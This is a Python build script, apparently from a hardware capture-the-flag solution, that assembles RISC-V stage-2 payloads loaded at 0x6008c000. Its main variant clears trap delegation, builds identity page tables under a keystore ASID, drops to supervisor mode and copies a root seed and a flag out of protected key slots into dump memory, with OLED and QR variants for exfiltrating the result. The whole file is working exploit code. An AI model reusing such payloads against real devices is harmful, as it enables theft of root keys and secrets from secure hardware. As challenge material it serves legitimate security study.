"""Stage-2 stubs parked at 0x6008c000."""

from __future__ import annotations

import sys
from pathlib import Path

from asm import assemble
from constants import (
    DUMP_FLAG1,
    DUMP_ROOT,
    LOADER_ENTRY,
    PAGE_TABLE_ADDR,
    SLOT_BYTES,
    SLOT_FLAG1,
    SLOT_ROOT,
    STAGE2_ADDR,
    TRUSTED_PID,
    DATA_SLOT_START,
)

PTE_DAXWRV = 0xCF  # V|R|W|X|A|D, supervisor, 4MiB leaf
SATP = (1 << 31) | (TRUSTED_PID << 22) | (PAGE_TABLE_ADDR >> 12)  # 0x80C61000

_ARCHIVE = Path(__file__).resolve().parent / "archive"


def slot_addr(index: int) -> int:
    return DATA_SLOT_START + index * SLOT_BYTES


def mega_pte(pa: int) -> int:
    return ((pa >> 22) << 20) | PTE_DAXWRV


SPIN_SRC = """
spin:
    j spin
"""

HANDBACK_SRC = f"""
    # jump to stock loader entry (0x{LOADER_ENTRY:08x})
    lui t0, 0x{(LOADER_ENTRY & 0xFFFFF000) >> 12:x}
    jalr zero, t0, 0x{LOADER_ENTRY & 0xFFF:x}
"""

# Privilege drop + copy ROOT_SEED + THE_FLAG_1 into SRAM, then spin.
# Matches amattas: satp ASID=keystore, MPP=S, clear medeleg, identity 4MiB maps.
ASID_HOLD_SRC = f"""
    addi t0, zero, 0
    csrw medeleg, t0
    csrw mideleg, t0

    li a0, 0x{PAGE_TABLE_ADDR:x}
    li a1, 1024
zero_pt:
    beq a1, zero, pt_fill
    sw zero, 0(a0)
    addi a0, a0, 4
    addi a1, a1, -1
    j zero_pt
pt_fill:
    li a0, 0x{PAGE_TABLE_ADDR:x}
    li t0, 0x{mega_pte(0x40000000):x}
    sw t0, 0x400(a0)
    li t0, 0x{mega_pte(0x60000000):x}
    sw t0, 0x600(a0)
    li t0, 0x{mega_pte(0x61000000):x}
    sw t0, 0x610(a0)

    la t0, m_trap
    csrw mtvec, t0

    li t0, 0x{SATP:x}
    csrw satp, t0

    li t1, 0x1800
    csrrc zero, mstatus, t1
    li t1, 0x800
    csrrs zero, mstatus, t1

    la t0, s_stub
    csrw mepc, t0
    mret

m_trap:
    j m_trap

s_stub:
    li a0, 0x{slot_addr(SLOT_ROOT):x}
    li a1, 0x{DUMP_ROOT:x}
    addi a2, zero, 8
copy_root:
    beq a2, zero, copy_flag
    lw t0, 0(a0)
    sw t0, 0(a1)
    addi a0, a0, 4
    addi a1, a1, 4
    addi a2, a2, -1
    j copy_root
copy_flag:
    li a0, 0x{slot_addr(SLOT_FLAG1):x}
    li a1, 0x{DUMP_FLAG1:x}
    addi a2, zero, 8
copy_flag_loop:
    beq a2, zero, s_done
    lw t0, 0(a0)
    sw t0, 0(a1)
    addi a0, a0, 4
    addi a1, a1, 4
    addi a2, a2, -1
    j copy_flag_loop
s_done:
    ecall
    j s_done
"""

# Front-door variants (smoke + recommended QR dump)
VARIANTS = {
    "spin": SPIN_SRC,
    "handback": HANDBACK_SRC,
    "asid_hold": ASID_HOLD_SRC,
}

FRONT_DOOR = ("spin", "handback", "asid_hold", "asid_qr")
ARCHIVE_VARIANTS = ("asid_oled", "asid_pages", "asid_scd")
HANG_VARIANTS = frozenset({*FRONT_DOOR, *ARCHIVE_VARIANTS} - {"handback"})


def _src(variant: str) -> str:
    if variant == "asid_qr":
        from oled_qr import oled_qr_src

        return oled_qr_src()
    if variant in ARCHIVE_VARIANTS:
        sys.path.insert(0, str(_ARCHIVE))
        if variant == "asid_oled":
            from oled_dump import oled_dump_src

            return oled_dump_src()
        if variant == "asid_pages":
            from oled_pages import oled_pages_src

            return oled_pages_src()
        if variant == "asid_scd":
            from oled_scd import oled_scd_src

            return oled_scd_src()
    if variant not in VARIANTS:
        names = ", ".join([*FRONT_DOOR, *ARCHIVE_VARIANTS])
        raise SystemExit(f"unknown variant {variant}; choose from {names}")
    return VARIANTS[variant]


def build_stage2(variant: str) -> bytes:
    blob = assemble(_src(variant), base=STAGE2_ADDR)
    if len(blob) > 0x9FD00 - 0x8C000:
        raise SystemExit(f"stage2 too large: {len(blob)} bytes")
    return blob
